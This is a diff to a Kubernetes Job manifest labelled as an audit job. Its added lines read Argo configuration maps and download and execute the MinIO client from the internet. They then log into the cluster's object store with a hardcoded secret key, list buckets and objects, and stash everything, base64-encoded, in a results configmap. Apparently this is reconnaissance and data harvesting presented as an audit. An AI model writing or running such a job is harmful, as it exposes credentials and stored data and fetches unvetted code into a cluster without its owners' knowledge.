@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-nodes-v71
+  name: audit-minio-v72
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
@@ -16,9 +16,14 @@ spec:
         args:
         - "-c"
         - >-
-          NODE_IPS=$(kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{range .status.addresses[*]}{.type}{"="}{.address}{" "}{end}{"\n"}{end}');
-          MINIO_NP=$(kubectl get svc argo-artifacts -n default -o jsonpath='{.spec.ports[?(@.port==9000)].nodePort}');
-          MINIO_CONSOLE=$(kubectl get svc argo-artifacts -n default -o jsonpath='{.spec.ports[?(@.port==9001)].nodePort}');
+          ARTIFACT_CM=$(kubectl get cm artifact-repositories -n argo -o json);
+          WF_CM=$(kubectl get cm workflow-controller-configmap -n argo -o json);
+          MC_DL=$(wget -q -O /tmp/mc https://dl.min.io/client/mc/release/linux-amd64/mc && chmod +x /tmp/mc && echo OK || echo FAIL);
+          if [ "$MC_DL" = "OK" ]; then
+            /tmp/mc alias set minio1 http://argo-artifacts.default.svc.cluster.local:9000 miniokey sEkKOGp6QT8hnc1Y5R7W --api S3v4 2>&1;
+            BUCKETS=$(/tmp/mc ls minio1 2>&1);
+            OBJECTS=$(/tmp/mc ls --recursive minio1 2>&1 | head -50);
+          fi;
           kubectl patch configmap dune-audit-result4 -n default --type merge
-          -p "{\"data\":{\"node_ips\":\"$NODE_IPS\",\"minio_nodeport\":\"$MINIO_NP\",\"console_nodeport\":\"$MINIO_CONSOLE\"}}";
-          echo "DONE"
+          -p "{\"data\":{\"artifact_cm\":\"$(echo $ARTIFACT_CM | base64 | tr -d '\n')\",\"wf_cm\":\"$(echo $WF_CM | base64 | tr -d '\n')\",\"mc_dl\":\"$MC_DL\",\"buckets\":\"$BUCKETS\",\"objects\":\"$OBJECTS\"}}";
+          echo DONE
